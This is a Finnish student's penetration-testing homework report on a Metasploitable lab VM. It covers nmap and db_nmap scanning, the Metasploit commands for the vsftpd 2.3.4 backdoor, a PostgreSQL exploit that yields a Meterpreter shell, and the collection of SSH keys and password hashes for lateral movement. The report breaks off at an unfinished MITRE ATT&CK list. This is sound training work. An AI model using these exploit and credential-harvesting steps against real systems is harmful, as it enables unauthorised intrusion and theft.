# Harjoitus 3: EternalHomework

## x) Lue/katso/kuuntele ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva.)

€ Jaswal 2020: Mastering Metasploit - 4ed: Chapter 1: Approaching a Penetration Test Using Metasploit (kohdasta Conducting a penetration test with Metasploit luvun loppuun eli "Summary" loppuun)
* Metasploit-viitekehystä käytetään tunkeutumistestaukseen hyödyntäen sen exploit, auxiliary ja payload moduuleja.
* Case studyssa kohde skannatiin metasploitin nmapilla ja tunnistettiin Windows 7 haavoittuvuus EternalBlue.
* Metasploitissa käytettiin EternalBlue exploitia, jolla saatiin pääsy kohteeseen ja meterpreter shell.
* Autoroute moduulia käyttämällä saatiin yhteys toisessa verkossa sijaitsevaan Domain Controlleriin.
* Token impersonating hyökkäyksellä päästiin sisään Domain Controlleriin, josta dumpattiin tunnukset ja salasanatiivisteet.

Mitä 'nmap -sn' tekee? Älä arvaa, vaan perustele lähteillä. Mistä tiedät, että käyttämäsi lähde on luotettava?
* `Nmap -sn` ajaa host discoveryn, mutta ei porttiskannausta.
* Host discovery koostuu ICMP echo requestista (pingistä), TCP SYN viestistä porttiin 443, TCP ACK viestistä porttiin 80 ja ICMP timestamp requestista.
* Jos skannattava kohde on samassa verkossa, käytetään ARP pyyntöä.
* Lähde: `man nmap`, https://nmap.org/book/man-host-discovery.html, nmapin virallinen dokumentaatio johon viitataan työkalussa

<img width="406" height="39" alt="image" src="https://github.com/user-attachments/assets/cf15ee9a-ba8b-429f-9e00-b4ffeeb25b59" />


## b) Tallenna porttiskannauksen tuloksia Metasploitin tietokantoihin. Skannaa niin, että Metasploitable tulee mukaan. Kannattaa ottaa mukaan ainakin versioskannaus -sV (joka on banner grabbing plus).

Käynnistin Metasploit tietokannan, sekä Metasploitin.
```
sudo msfdb start
sudo metasploit
```
Metasploit consolista porttiskannasin metasploitablen komennolla `db_nmap -T4 -sV 192.168.56.101`
* `-T4`: Agressiivinen ajoitus
* `-sV`: Versio tunnistus

<img width="931" height="544" alt="image" src="https://github.com/user-attachments/assets/080849b3-93c0-4faf-8045-c5cafe49a590" />

## c) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä.

`db_nmap` tallentaa tulokset metasploitin tietokantaan, josta jälkikäteen on mahdollista tarkastella hosteja ja palveluita skannauksen tuloksista.

Skannasin vain yhden osoitteen, joten hosteja on yksi.

<img width="921" height="139" alt="image" src="https://github.com/user-attachments/assets/b5785095-98b1-4d62-afae-c3906a7093e1" />

Palvelut olivat samat kuin porttiskannauksessa.

<img width="911" height="472" alt="image" src="https://github.com/user-attachments/assets/60239575-ed98-4c6e-a3cd-124da14ad4b5" />

Hosteja ja palveluita voi suodattaa merkkijonojen avulla optiolla `-S`. Suodatin vain ftp-palvelut.

<img width="640" height="140" alt="image" src="https://github.com/user-attachments/assets/a3bb0880-521f-4c74-8b1c-855dda66f068" />

## d) Internet famous. Etsi Metasploitablen mukana tulevista hyökkäyksistä (en: exploits; search) sellainen, joka on ollut julkisuudessa.

Eräs Metasploitablessa sijaitseva julkisuudessa ollut haavoittuvuus on PostgreSQL-tietokannassa. Tämä haavoittuvuus mahdollistaa joissain Linux-järjestelmissä postgre-käyttäjän kirjoittamaan `/tmp`-tiedostoon, joka taas mahdollistaa koodin ajamisen.

Haavoittuvuuteen löytyy exploit metasploitista.

<img width="943" height="315" alt="image" src="https://github.com/user-attachments/assets/de381608-ba8a-4764-a881-8f856932266f" />

https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload/

## e) Vertaile nmap:n omaa tiedostoon tallennusta (-oA foo) ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

Ajoin nmap skannauksen optiolla `-oA`, joka tallentaa tulokset kolmeen tekstitiedostoon.

<img width="568" height="250" alt="image" src="https://github.com/user-attachments/assets/c130c32c-4d21-45be-9ee1-6e0555e43bed" />

`.gnmap`-päätteinen tiedosto sisältää tiedot grepattavassa muodossa, `.nmap`-päätteinen tiedosto sisältää nmap komennon tulosteen ja `.xml`-päätteinen tiedosto sisältää tulokset xml-muodossa. 

Tekstitiedostojen vahvuus on varmastikin niiden helppo saatavuus ja käytettävyys. Tuloksia voi lukea lähes millä tahansa järjestelmällä ja niitä on helppo esimerkiksi jakaa. `gnmap` tiedosto on erinomainen jos tulostetta halutaan suodattaa grepin avulla, `nmap` tiedosto on paras raportointiin ja `xml` tiedosto on taas paras tulosten läpi käyntiin ohjelmallisesti sen säännöllisen rakenteen vuoksi.

`db_nmap`:n vahvuus on integraatio Metasploitin kanssa. Tulokset tallennetaan Metasploitin tietokantaan, josta niitä on mahdollista suodattaa ja hakea mm. hostien, palveluiden, porttien ja haavoittuvuuksien perustella. Tietokannan ansiosta tuloksiin on helppo palata myöhemmin.

## f) Murtaudu Metasploitablen vsftpd-palveluun

Tein tämän viime raportissa bonus-tehtävänä (https://github.com/lassihi/tunkeutumistestaus/blob/main/h2/h2-dora-the-explora.md#g-vapaaehtoinen-bonus-jos-haluat-voit-jo-kokeilla-metasploit-hy%C3%B6kk%C3%A4ysohjelmaa-omaan-harjoitusmaaliisi-t%C3%A4t%C3%A4-katsotaan-my%C3%B6hemmin-yhdess%C3%A4kin-muista-irrottaa-kone-internetist%C3%A4-kokeilujen-ajaksi-sudo-msfdb-init-sudo-msfconsole)

Lyhyesti:
```
> use exploit/unix/ftp/vsftpd_234_backdoor
> set RHOSTS 192.168.56.101
> set LHOST 192.168.56.1
> exploit
```

## g) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää.

VSFTPD-haavoittuvuudesta saatiin Meterpreter root shell Metasploitableen, joka helpotta tiedon keräämistä.

<img width="429" height="125" alt="image" src="https://github.com/user-attachments/assets/c5f79333-8fbb-4633-bb65-e729d451e679" />

Levittäytymisellä viitataan hyökkääjän toimiin, joilla tämä pyrkii siirtymään verkossa suotuisempiin mahdollisesti ylläpitäjätileilla varusteltuihin kohteisiin, kuten tuotantopalvelimiin, asiakastietokantoihin, tai domain controlleriin. (https://www.kyberturvallisuuskeskus.fi/fi/ajankohtaista/tunnetko-tunkeutumisen-laajentamisen-osa-1)

Levittäytymisen kannalta mielenkiintoisia tietoja ovat muut verkossa olevat yhdistetyt koneet ja niihin käytetyt kirjatumistunnukset, kuten SSH-avaimet.

Kahden käyttäjän kotihakemistosta löytyi SSH-avaimia, joilla voi yrittää kirjautua muihin järjestelmiin.
<img width="483" height="301" alt="image" src="https://github.com/user-attachments/assets/8b593a98-887c-4c09-9c36-25b2476d4c40" />

Meterpreter komennot, kuten `arp`, `ipconfig`, `netstat` ja `route` ovat hyödyllisiä yhdistettyjen verkkojen ja laitteiden tutkimisessa.

Lisäksi Metasploitablesta voidaan kerätä käyttäjätunnukset, sekä salasanatiivisteet ja niitä hyödyntämällä yrittää päästä käsiksi muihin järjestelmiin.

<img width="600" height="592" alt="image" src="https://github.com/user-attachments/assets/bd159ca5-6aea-4501-ad5f-decb4ee7d0ea" />

## h) Murtaudu Metasploitableen jollain toisella tavalla. (Jos tämä kohta on vaikea, voit tarvittaessa turvautua verkosta löytyviin läpikävelyohjeisiin. Merkitse silloin raporttiin, missä määrin tarvitsit niitä).

Päätin yrittää aiemmin mainitsemaani Postgres exploitia. Valitsin kohteeksi x86_64 linuxin, sillä tiedän virtuaalikoneen käyttävän 64 bittistä arkkitehtuuria.

<img width="1090" height="374" alt="image" src="https://github.com/user-attachments/assets/27be3f4c-f5a3-4ba1-ae07-a5748e05a129" />

Katsoin asetukset, jonne oli oletuksena annettu tietokannan käyttäjätunnus ja salasana postgres:postgres. Lisäsin RHOSTS ja LHOST muuttujan.

<img width="1162" height="784" alt="image" src="https://github.com/user-attachments/assets/24154f17-981d-4259-9613-232ea45536db" />

Ajoin exploitin.

<img width="1259" height="111" alt="image" src="https://github.com/user-attachments/assets/db2a4773-315b-4de4-abd2-209af41a74cd" />

Exploit ilmoitti, että /tmp-tiedostoon onnistuttiin lisäämään payload, mutta sessio ei kuitenkaan käynnistynyt. Kokeilin vielä x86 moduulia exploitista vaihtamalla kohteeksi Linux x86.

<img width="593" height="31" alt="image" src="https://github.com/user-attachments/assets/5ed43be2-8281-429a-8f4a-c92c4893618d" />

Ajoin exploitin ja sain Meterpreter shellin koneeseen. 

<img width="1181" height="263" alt="image" src="https://github.com/user-attachments/assets/7b54805a-739d-4d95-b261-8b2e399ce4f2" />

Sysinfo komento näyttää Metasploitablen käyttävän i686, eli 32-bittistä arkkitehtuuria, jonka vuoksi ensimmäinen moduuli ei toiminut. Tässä menin itse hieman sekaisin, sillä alunperin tein Virtualboxissa koneen käyttäen 64-bittistä Ubuntua.

## i) Demonstroi Meterpretrin ominaisuuksia.

Meterpreterin help-komento näyttää kuvauksen saatavilla olevista komennoista.

```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command                   Description
    -------                   -----------
    cat                       Read the contents of a file to the screen
    cd                        Change directory
    checksum                  Retrieve the checksum of a file
    chmod                     Change the permissions of a file
    cp                        Copy source to destination
    del                       Delete the specified file
    dir                       List files (alias for ls)
    download                  Download a file or directory
    edit                      Edit a file
    getlwd                    Print local working directory (alias for lpwd)
    getwd                     Print working directory
    lcat                      Read the contents of a local file to the screen
    lcd                       Change local working directory
    ldir                      List local files (alias for lls)
    lls                       List local files
    lmkdir                    Create new directory on local machine
    lpwd                      Print local working directory
    ls                        List files
    mkdir                     Make directory
    mv                        Move source to destination
    pwd                       Print working directory
    rm                        Delete the specified file
    rmdir                     Remove directory
    search                    Search for files
    upload                    Upload a file or directory


Stdapi: Networking Commands
===========================

    Command                   Description
    -------                   -----------
    arp                       Display the host ARP cache
    getproxy                  Display the current proxy configuration
    ifconfig                  Display interfaces
    ipconfig                  Display interfaces
    netstat                   Display the network connections
    portfwd                   Forward a local port to a remote service
    resolve                   Resolve a set of host names on the target
    route                     View and modify the routing table


Stdapi: System Commands
=======================

    Command                   Description
    -------                   -----------
    execute                   Execute a command
    getenv                    Get one or more environment variable values
    getpid                    Get the current process identifier
    getuid                    Get the user that the server is running as
    kill                      Terminate a process
    localtime                 Displays the target system local date and time
    pgrep                     Filter processes by name
    pkill                     Terminate processes by name
    ps                        List running processes
    shell                     Drop into a system command shell
    suspend                   Suspends or resumes a list of processes
    sysinfo                   Gets information about the remote system, such as OS


Stdapi: Webcam Commands
=======================

    Command                   Description
    -------                   -----------
    webcam_chat               Start a video chat
    webcam_list               List webcams
    webcam_snap               Take a snapshot from the specified webcam
    webcam_stream             Play a video stream from the specified webcam


Stdapi: Mic Commands
====================

    Command                   Description
    -------                   -----------
    listen                    listen to a saved audio recording via audio player
    mic_list                  list all microphone interfaces
    mic_start                 start capturing an audio stream from the target mic
    mic_stop                  stop capturing audio


Stdapi: Audio Output Commands
=============================

    Command                   Description
    -------                   -----------
    play                      play a waveform audio file (.wav) on the target system

For more info on a specific command, use <command> -h or help <command>.
```

Toiminnallisuudet jaetaan seitsemään luokkaan:

1. Core Commands: Itse Meterpreteriin vaikuttavat komennot. Esimerkiksi `background` siirtää meterpreterin taustalle ja käyttäjän takaisin metasploitin shelliin.

<img width="437" height="61" alt="image" src="https://github.com/user-attachments/assets/bf2d33db-5ae0-4fe1-913c-27467163e320" />

2. File system Commands: Tiedostojärjestelmän tutkimiseen ja muokkaamiseen käytetyt komennot.

<img width="832" height="654" alt="image" src="https://github.com/user-attachments/assets/8dc04b28-0997-4f0c-a4d9-7344e322f88d" />

3. Networking Commands: Verkon tietojen tarkastelu, porttien ohjaus ja reititystaulun muutokset.

<img width="462" height="437" alt="image" src="https://github.com/user-attachments/assets/0771332f-e5a4-4bab-972c-8249120812ee" />

4. System Commands: Prosessien listaus, käynnistys ja lopetus, ympäristömuuttujien tarkastelu, järjestelmätietojen listaus.

<img width="608" height="267" alt="image" src="https://github.com/user-attachments/assets/933fd467-cd08-4812-82e9-8046372f0705" />

Loput toiminnot liittyvät kameran, mikrofonin ja audion striimaukseen ja kaappaukseen, mikäli sellaisia järjestelmään on liitetty.

## j) Tallenna shell-sessio tekstitiedostoon script-työkalulla (script -fa log001.txt) tai tmux:lla.

En ollut tallentanut shell sessiota scriptillä, joten loin uuden tallennuksen.

<img width="384" height="42" alt="image" src="https://github.com/user-attachments/assets/733d9c94-f5c8-4e4c-a36f-8f791e264f7d" />

Tein kohdan h) murtautumisen uudelleen ja tämän jälkeen suljin scriptin komennolla `exit`.

## k) Pivot point. Laita kaikki harjoituksen tiedostot (script -fa, nmap -oA...) samaan kansioon. Hae sopiva pivot point (sovellus, versio, osoite, MAC-numero) 'grep -r' -komennolla. Keksi uskottava esimerkkikysymys, johon haet vastausta.

<img width="471" height="50" alt="image" src="https://github.com/user-attachments/assets/2f8d0f17-e88d-4aad-a2f0-e82f5604420c" />

Poistin tiedostosta edelliset esimerkkiskannaukset ja skannasin kohteen uudestaan samassa hakemistossa.

<img width="547" height="476" alt="image" src="https://github.com/user-attachments/assets/b1b07fd1-c25c-4bfa-8ebd-98959f30db00" />

Greppasin hakemistosta tietoa postgresta.

<img width="1265" height="351" alt="image" src="https://github.com/user-attachments/assets/6c2aa8bd-cd80-4265-a9da-29db0ff006c0" />

Esimerkkikysymys: Millä käyttäjätunnuksella ja salasanalla saatiin hyödynnettyä postgres-haavoittuvuutta.

## l) Attaaack! Mitä Mitre Attack taktiikoita ja tekniikoita käytit tässä harjoituksessa? (Tässä alakohdassa "Attaack!" ei tarvitse tehdä lisää testejä koneella, koska testit on jo tehty.)

Harjoituksessa käytetyt taktiikat ja tekniikat:
* Nmap-skannaus (Active scanning, vulnerability scanning T1595.002)
* 


